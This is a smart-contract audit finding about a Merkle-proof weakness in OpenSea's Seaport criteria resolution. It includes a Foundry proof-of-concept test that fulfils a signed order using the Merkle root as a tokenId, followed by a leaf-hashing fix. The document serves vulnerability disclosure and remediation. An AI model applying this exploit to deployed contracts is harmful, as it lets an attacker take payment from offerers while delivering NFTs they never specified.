## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- sponsor confirmed

# [Merkle Tree criteria can be resolved by wrong tokenIDs](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168) 

# Lines of code

https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157


# Vulnerability details

## Impact
The protocol allows specifying several tokenIds to accept for a single offer.
A merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item.
The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.

There are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**.
It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.

This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria.
Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.

#### Example
Alice wants to buy either NFT with tokenId 1 or tokenId 2.
She creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`.
She creates an offer for this criteria.
An attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.

> One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard.
> 
> "While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'." [EIP721](https://eips.ethereum.org/EIPS/eip-721)
>
> Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions.
> Therefore, ERC721-compliant token contracts are vulnerable to this attack.

#### POC
Here's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in _Example_.

```solidity
contract BugMerkleTree is BaseOrderTest {
    struct Context {
        ConsiderationInterface consideration;
        bytes32 tokenCriteria;
        uint256 paymentAmount;
        address zone;
        bytes32 zoneHash;
        uint256 salt;
    }

    function hashHashes(bytes32 hash1, bytes32 hash2)
        internal
        returns (bytes32)
    {
        // see MerkleProof.verify
        bytes memory encoding;
        if (hash1 <= hash2) {
            encoding = abi.encodePacked(hash1, hash2);
        } else {
            encoding = abi.encodePacked(hash2, hash1);
        }
        return keccak256(encoding);
    }

    function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {
        // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree
        bytes32 leafLeft = bytes32(uint256(1));
        bytes32 leafRight = bytes32(uint256(2));
        bytes32 merkleRoot = hashHashes(leafLeft, leafRight);
        console.logBytes32(merkleRoot);

        Context memory context = Context(
            consideration,
            merkleRoot, /* tokenCriteria */
            1e18, /* paymentAmount */
            address(0), /* zone */
            bytes32(0), /* zoneHash */
            uint256(0) /* salt */
        );
        bytes32 conduitKey = bytes32(0);

        token1.mint(address(alice), context.paymentAmount);
        // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable
        // we acquire the merkle root ID
        test721_1.mint(address(this), uint256(merkleRoot));

        _configureERC20OfferItem(
            // start, end
            context.paymentAmount, context.paymentAmount
        );
        _configureConsiderationItem(
            ItemType.ERC721_WITH_CRITERIA,
            address(test721_1),
            // @audit set merkle root for NFTs we want to accept
            uint256(context.tokenCriteria), /* identifierOrCriteria */
            1,
            1,
            alice
        );

        OrderParameters memory orderParameters = OrderParameters(
            address(alice),
            context.zone,
            offerItems,
            considerationItems,
            OrderType.FULL_OPEN,
            block.timestamp,
            block.timestamp + 1000,
            context.zoneHash,
            context.salt,
            conduitKey,
            considerationItems.length
        );

        OrderComponents memory orderComponents = getOrderComponents(
            orderParameters,
            context.consideration.getNonce(alice)
        );
        bytes32 orderHash = context.consideration.getOrderHash(orderComponents);
        bytes memory signature = signOrder(
            context.consideration,
            alicePk,
            orderHash
        );

        delete offerItems;
        delete considerationItems;

        /*************** ATTACK STARTS HERE ***************/
        AdvancedOrder memory advancedOrder = AdvancedOrder(
            orderParameters,
            1, /* numerator */
            1, /* denominator */
            signature,
            ""
        );

        // resolve the merkle root token ID itself
        CriteriaResolver[] memory cr = new CriteriaResolver[](1);
        bytes32[] memory proof = new bytes32[](0);
        cr[0] = CriteriaResolver(
              0, // uint256 orderIndex;
              Side.CONSIDERATION, // Side side;
              0, // uint256 index; (item)
              uint256(merkleRoot), // uint256 identifier;
              proof // bytes32[] criteriaProof;
        );

        uint256 profit = token1.balanceOf(address(this));
        context.consideration.fulfillAdvancedOrder{
            value: context.paymentAmount
        }(advancedOrder, cr, bytes32(0));
        profit = token1.balanceOf(address(this)) - profit;

        // @audit could fulfill order without owning NFT 1 or 2
        assertEq(profit, context.paymentAmount);
    }
}
```

## Recommended Mitigation Steps
Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a _leaf_ or not.
An elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)
Then compute the leaf hash in the contract from the provided tokenId:

```diff
function _verifyProof(
    uint256 leaf,
    uint256 root,
    bytes32[] memory proof
) internal pure {
    bool isValid;

-    assembly {
-        let computedHash := leaf
+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))
  ...
```

There can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.

Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)


